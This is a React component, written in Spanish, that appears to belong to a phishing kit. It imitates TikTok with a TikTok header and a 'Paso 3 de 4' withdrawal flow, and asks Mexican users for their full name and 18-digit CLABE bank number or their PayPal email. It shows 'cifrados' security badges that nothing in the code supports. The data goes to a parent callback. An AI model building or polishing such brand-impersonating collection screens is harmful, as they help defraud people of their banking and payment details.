import { useState } from "react";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { ShieldCheck, ChevronRight, Building2, Wallet } from "lucide-react";
import TikTokHeader from "./TikTokHeader";

interface BankDetailsScreenProps {
  userName: string;
  onSubmit: (method: string, details: Record<string, string>) => void;
}

const WITHDRAWAL_METHODS = [
  {
    id: "spei",
    label: "Transferencia SPEI",
    subtitle: "Transferencia bancaria inmediata",
    icon: Building2,
  },
  {
    id: "paypal",
    label: "PayPal",
    subtitle: "Envío a tu email de PayPal",
    icon: Wallet,
  },
];

const MX_BANKS = [
  "BBVA", "Santander", "Banamex", "Banorte", "HSBC",
  "Scotiabank", "Inbursa", "Azteca", "Nu México", "Mercado Pago",
];

const FIELD_LABELS: Record<string, string> = {
  clabe: "CLABE interbancaria",
  name: "Nombre completo",
  email: "Email de PayPal",
};

type Step = "method" | "form" | "confirm";

const BankDetailsScreen = ({ userName, onSubmit }: BankDetailsScreenProps) => {
  const [step, setStep] = useState<Step>("method");
  const [selectedMethod, setSelectedMethod] = useState("");
  const [details, setDetails] = useState<Record<string, string>>({});

  const method = WITHDRAWAL_METHODS.find((m) => m.id === selectedMethod);

  const updateDetail = (key: string, value: string) =>
    setDetails((prev) => ({ ...prev, [key]: value }));

  const isFormValid = () => {
    if (selectedMethod === "spei") {
      return (
        (details.name?.trim().length ?? 0) > 2 &&
        (details.clabe?.length ?? 0) === 18
      );
    }
    if (selectedMethod === "paypal") {
      return (details.email?.length ?? 0) > 3;
    }
    return false;
  };

  const handleConfirm = () => onSubmit(selectedMethod, details);

  // --- METHOD SELECTION ---
  if (step === "method") {
    return (
      <div className="min-h-screen flex flex-col bg-background">
        <TikTokHeader showHelp />
        <div className="flex-1 px-6 py-6">
          <p className="text-sm text-muted-foreground mb-1">
            Bienvenido/a de nuevo, <strong className="text-foreground">{userName}!</strong>
          </p>
          <div className="mt-4 mb-2 flex items-center justify-between">
            <h2 className="text-xl font-semibold">Agregar método de retiro</h2>
            <span className="text-xs font-semibold text-muted-foreground bg-secondary px-3 py-1 rounded-full">
              Paso 3 de 4
            </span>
          </div>
          <p className="text-sm text-muted-foreground mb-5">
            Elige cómo quieres recibir tus fondos.
          </p>

          <div className="rounded-2xl border border-border bg-card overflow-hidden">
            {WITHDRAWAL_METHODS.map((m, i) => {
              const Icon = m.icon;
              return (
                <button
                  key={m.id}
                  onClick={() => { setSelectedMethod(m.id); setStep("form"); }}
                  className={`w-full flex items-center gap-3.5 px-4 py-3.5 text-left hover:bg-accent/50 transition-colors ${
                    i < WITHDRAWAL_METHODS.length - 1 ? "border-b border-border" : ""
                  }`}
                >
                  <div className="w-10 h-10 rounded-xl bg-secondary flex items-center justify-center shrink-0">
                    <Icon className="w-5 h-5 text-foreground" />
                  </div>
                  <div className="flex-1 min-w-0">
                    <p className="text-sm font-medium">{m.label}</p>
                    <p className="text-xs text-muted-foreground">{m.subtitle}</p>
                  </div>
                  <ChevronRight className="w-4 h-4 text-muted-foreground shrink-0" />
                </button>
              );
            })}
          </div>
        </div>
      </div>
    );
  }

  // --- CONFIRMATION ---
  if (step === "confirm") {
    const entries = Object.entries(details).filter(([, v]) => v);
    return (
      <div className="min-h-screen flex flex-col bg-background">
        <TikTokHeader showHelp />
        <div className="flex-1 px-6 py-6">
          <div className="mt-4 mb-2 flex items-center justify-between">
            <h2 className="text-xl font-semibold">Confirma tus datos</h2>
            <span className="text-xs font-semibold text-muted-foreground bg-secondary px-3 py-1 rounded-full">
              Paso 3 de 4
            </span>
          </div>
          <p className="text-sm text-muted-foreground mb-6">
            Revisa tu información de {method?.label} antes de enviar.
          </p>

          <div className="rounded-2xl border border-border bg-card p-5 space-y-4">
            <div>
              <p className="text-xs text-muted-foreground">Método</p>
              <p className="text-sm font-medium">{method?.label}</p>
            </div>
            {entries.map(([key, value]) => (
              <div key={key}>
                <div className="h-px bg-border" />
                <div className="pt-4">
                  <p className="text-xs text-muted-foreground">{FIELD_LABELS[key] ?? key}</p>
                  <p className="text-sm font-medium">
                    {key === "clabe"
                      ? value.slice(0, -4).replace(/./g, "•") + value.slice(-4)
                      : value}
                  </p>
                </div>
              </div>
            ))}
          </div>

          <div className="flex items-center gap-2 p-3 rounded-xl bg-success/5 border border-success/20 mt-5">
            <ShieldCheck className="w-4 h-4 text-success shrink-0" />
            <p className="text-xs text-muted-foreground">
              Tus datos están <strong className="text-foreground">cifrados</strong> y protegidos.
            </p>
          </div>

          <Button onClick={handleConfirm} className="w-full h-14 rounded-full text-base font-semibold mt-8">
            Confirmar y continuar
          </Button>
          <Button variant="ghost" onClick={() => setStep("form")} className="w-full mt-3 text-sm text-muted-foreground">
            ← Volver y editar
          </Button>
        </div>
      </div>
    );
  }

  // --- FORM (per method) ---
  return (
    <div className="min-h-screen flex flex-col bg-background">
      <TikTokHeader showHelp />
      <div className="flex-1 px-6 py-6">
        <div className="mt-4 mb-2 flex items-center justify-between">
          <h2 className="text-xl font-semibold">Datos de {method?.label}</h2>
          <span className="text-xs font-semibold text-muted-foreground bg-secondary px-3 py-1 rounded-full">
            Paso 3 de 4
          </span>
        </div>
        <p className="text-sm text-muted-foreground mb-4">
          Ingresa tu información de {method?.label} para recibir tu retiro.
        </p>

        <div className="flex items-center gap-2 p-3 rounded-xl bg-success/5 border border-success/20 mb-5">
          <ShieldCheck className="w-4 h-4 text-success shrink-0" />
          <p className="text-xs text-muted-foreground">
            Tus datos están <strong className="text-foreground">cifrados</strong> y almacenados de forma segura.
          </p>
        </div>

        <div className="space-y-4">
          {selectedMethod === "spei" && (
            <>
              <div>
                <label className="text-sm font-medium mb-1.5 block">Nombre completo</label>
                <Input
                  type="text"
                  placeholder="Tu nombre completo"
                  value={details.name || ""}
                  onChange={(e) => updateDetail("name", e.target.value)}
                  className="h-12 rounded-xl"
                />
              </div>
              <div>
                <label className="text-sm font-medium mb-1.5 block">CLABE interbancaria</label>
                <Input
                  type="text"
                  inputMode="numeric"
                  maxLength={18}
                  placeholder="18 dígitos"
                  value={details.clabe || ""}
                  onChange={(e) => updateDetail("clabe", e.target.value.replace(/\D/g, ""))}
                  className="h-12 rounded-xl"
                />
                {(details.clabe?.length ?? 0) > 0 && (details.clabe?.length ?? 0) < 18 && (
                  <p className="text-xs text-destructive mt-1">La CLABE debe tener exactamente 18 dígitos</p>
                )}
              </div>
              <p className="text-xs text-muted-foreground">
                Bancos compatibles: {MX_BANKS.join(", ")}.
              </p>
            </>
          )}

          {selectedMethod === "paypal" && (
            <div>
              <label className="text-sm font-medium mb-1.5 block">Email de PayPal</label>
              <Input
                type="email" placeholder="tu@ejemplo.com"
                value={details.email || ""}
                onChange={(e) => updateDetail("email", e.target.value)}
                className="h-12 rounded-xl"
              />
            </div>
          )}
        </div>

        <Button
          onClick={() => setStep("confirm")}
          disabled={!isFormValid()}
          className="w-full h-14 rounded-full text-base font-semibold mt-8"
        >
          Continuar
        </Button>
        <Button variant="ghost" onClick={() => { setStep("method"); setDetails({}); }} className="w-full mt-3 text-sm text-muted-foreground">
          ← Cambiar método
        </Button>
      </div>
    </div>
  );
};

export default BankDetailsScreen;
